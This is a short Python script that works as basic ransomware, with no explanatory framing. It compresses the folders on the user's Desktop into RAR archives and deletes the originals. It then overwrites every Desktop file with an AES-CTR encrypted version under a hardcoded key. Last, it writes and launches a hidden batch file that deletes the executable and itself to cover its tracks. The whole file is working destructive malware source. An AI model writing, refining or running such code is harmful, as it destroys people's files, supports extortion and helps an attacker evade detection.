import os, pyaes, subprocess, shutil, sys, time

# work folder
desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')

# key must be 16, 24 or 32 bytes
key = b'abcdefghijklmnopqrstuvwxyz012345'

# winrar path
winrar_path = r"C:\Program Files\WinRAR\Rar.exe"

if os.path.exists(winrar_path): # check if winrar is installed
    # if the winrar isn't installed on the machine, this program will encrypt just files
    
    # 1st compacting the directories
    for i in os.listdir(desktop):
        file_dir = os.path.join(desktop, i)

        if os.path.isdir(file_dir):  # if directory
            rar_path = os.path.join(desktop, f'{i}.rar')  # .rar path

            try:
                subprocess.run(
                    [winrar_path, "a", "-r", rar_path, file_dir], check=True
                )

                # del dir
                shutil.rmtree(file_dir)

            except:
                continue

# encrypting
for i in os.listdir(desktop):
    file_dir = os.path.join(desktop, i)

    if os.path.isfile(file_dir):
        try:
            # read the files
            with open(file_dir, 'rb') as f:
                file_data = f.read()

            aes = pyaes.AESModeOfOperationCTR(key)
            encrypted_data = aes.encrypt(file_data)

            # rewrite the files
            with open(file_dir, 'wb') as f:
                f.write(encrypted_data)

        except:
            continue


# bat to del itself
script_dir = os.path.dirname(sys.executable)  # exe path

# path files
bat_file = os.path.join(script_dir, "hoe.bat")
del_file = os.path.join(script_dir, os.path.basename(sys.executable)) # the exe

# making .bat
try:
    with open(bat_file, "w") as f:
        f.write("@echo off\n")
        f.write("timeout /t 2 >nul\n")  # 2 sec to del
        f.write(f'del /f /q "{del_file}"\n')
        f.write(f'del /f /q "{bat_file}"\n')

    # run .bat
    os.system(f'start /min cmd /c "{bat_file}"')
    sys.exit()

except:
    pass
